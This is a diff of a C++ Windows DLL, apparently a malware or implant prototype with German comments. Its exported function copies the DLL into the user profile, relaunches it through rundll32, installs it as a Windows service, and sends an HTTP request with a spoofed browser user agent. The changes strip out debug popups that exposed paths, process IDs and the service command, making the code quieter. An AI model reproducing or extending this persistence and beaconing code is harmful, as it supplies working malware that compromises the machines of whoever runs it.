@@ -42,7 +42,7 @@ extern "C" __declspec (dllexport) void __cdecl func(
    int       nCmdShow      // show state
 )
 {
-
+ 
     //Pfad der dll Abfragen
     LPTSTR  strDLLPath1 = new TCHAR[_MAX_PATH];
     ::GetModuleFileName((HINSTANCE)&__ImageBase, strDLLPath1, _MAX_PATH);
@@ -52,13 +52,13 @@ extern "C" __declspec (dllexport) void __cdecl func(
    char* userprofile = getenv("USERPROFILE");
     std::string userprofileString(userprofile);
     std::cout << userprofileString;
-
+    
     if (exPath.find(userprofileString) != std::string::npos) {
         dllInUserprofile(exPath);
     }
     else {
-
-        MessageBox(0, exPath.c_str(), "func", 0);
+        
+       
         vs vis;
         ih = InternetOpen("Mozilla/4.0 (compatible)", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
         if (ih == NULL)
@@ -70,16 +70,17 @@ extern "C" __declspec (dllexport) void __cdecl func(
         vis.silent = FALSE;
 
         visit(&vis);
+        MessageBox(0, "Http-Request abgesendet", "func", 0);
     }
 
 
 
+ 
 
 
 
 
-
-
+ 
 }
 
 std::wstring s2ws(const std::string& s) //Source:https://stackoverflow.com/questions/27220/how-to-convert-stdstring-to-lpcwstr-in-c-unicode
@@ -99,14 +100,13 @@ void dllInUserprofile(std::string exPath) {
     selfCopy(exPath, target);
     PROCESS_INFORMATION pi = launchProcess("c:\\Windows\\system32\\rundll32.exe", target+ " func");
     std::string piS = std::to_string((unsigned int)pi.dwProcessId);
-    MessageBox(0, piS.c_str(), "func", 0);
     createService(target);
 }
 
 void selfCopy(std::string exPath, std::string target) {
     //Pfade zusammenbasteln
 
-
+   
     //Datentyp anpassen
     std::wstring sTemp = s2ws(exPath);
     LPCWSTR sourceW = sTemp.c_str();
@@ -121,7 +121,6 @@ void createService(std::string targetPath) {
     SC_HANDLE schService;
     TCHAR szPath[MAX_PATH];
     std::string command = "rundll32.exe \"" + targetPath + "\",func";
-    MessageBox(0, command.c_str(), "Service", 0);
     std::copy(command.begin(), command.end(), szPath);
     /*if (!GetModuleFileNameA(nullptr, szPath, MAX_PATH))
     {
